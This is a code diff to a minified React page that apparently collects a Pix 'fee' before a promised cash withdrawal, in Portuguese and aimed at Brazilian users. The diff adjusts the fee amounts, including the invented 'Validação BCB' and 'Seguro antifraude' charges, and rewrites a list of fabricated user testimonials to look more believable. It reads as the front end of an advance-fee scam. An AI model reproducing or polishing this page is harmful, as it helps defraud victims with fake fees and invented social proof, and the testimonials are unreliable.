@@ -63,7 +63,7 @@ const xe = () => {
     const [pixAmount, setPixAmount] = l.useState(null);
 
     const m = Number(d);
-    const B = Number(pixAmount ?? 3222); // Centavos
+    const B = Number(pixAmount ?? 2490); // Centavos
     const p = B / 100; // Valor final em Reais
 
     const g = ((w = a == null ? void 0 : a.name) == null ? void 0 : w.split(" ")[0]) || "";
@@ -212,7 +212,7 @@ const xe = () => {
                         children: "Validação BCB"
                     }), e.jsx("span", {
                         className: "text-foreground text-[12px] font-semibold",
-                        children: "R$ 18,10"
+                        children: "R$ 13,40"
                     })]
                 }), e.jsxs("div", {
                     className: "flex items-center justify-between",
@@ -221,7 +221,7 @@ const xe = () => {
                         children: "Seguro antifraude"
                     }), e.jsx("span", {
                         className: "text-foreground text-[12px] font-semibold",
-                        children: "R$ 18,10"
+                        children: "R$ 11,50"
                     })]
                 }), e.jsxs("div", {
                     className: "border-t border-[#E5E7EB] pt-1.5 flex items-center justify-between",
@@ -369,13 +369,13 @@ const xe = () => {
                 className: "text-muted-foreground text-[11px] uppercase tracking-wider font-bold text-center mb-1",
                 children: "Quem já sacou hoje"
             }), [{
-                img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min", text: "paguei achando q era cilada kkk mas o reembolso veio antes do saque, nunca mais duvido"
+                img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min", text: "mano eu nem tava acreditando muito mas entrou certinho na minha conta, apareceu o pix na hora"
             }, {
-                img: U, name: "Amanda S.", city: "Rio de Janeiro", value: "R$ 1.450", time: "há 28 min", text: "gente eu tava morrendo de medo mas fiz e caiu certinho, obrigada tiktok por essa oportunidade serio"
+                img: U, name: "Amanda S.", city: "Rio de Janeiro", value: "R$ 1.450", time: "há 28 min", text: "fiz pelo nubank aqui e confirmou normal, achei q ia demorar mais caiu rapido"
             }, {
-                img: Q, name: "Rafael O.", city: "Belo Horizonte", value: "R$ 3.200", time: "há 43 min", text: "terceira vez sacando ja, toda vez cai em menos de 2 min, nao tem erro nenhum"
+                img: Q, name: "Rafael O.", city: "Belo Horizonte", value: "R$ 3.200", time: "há 43 min", text: "eu achei q era so mais um app aleatorio mas realmente entrou o dinheiro"
             }, {
-                img: W, name: "Carla F.", city: "Curitiba", value: "R$ 980", time: "há 1h", text: "quase nao fiz por causa da taxa mas devolveram tao rapido q nem deu tempo de me arrepender kkk"
+                img: W, name: "Carla F.", city: "Curitiba", value: "R$ 980", time: "há 1h", text: "acabou de cair aqui kkkkk nem acredito ainda"
             }].map( (t, f) => e.jsxs("div", {
                 className: "flex gap-3 items-start py-2 border-b border-[#F0F0F0] last:border-0",
                 children: [e.jsx("img", {
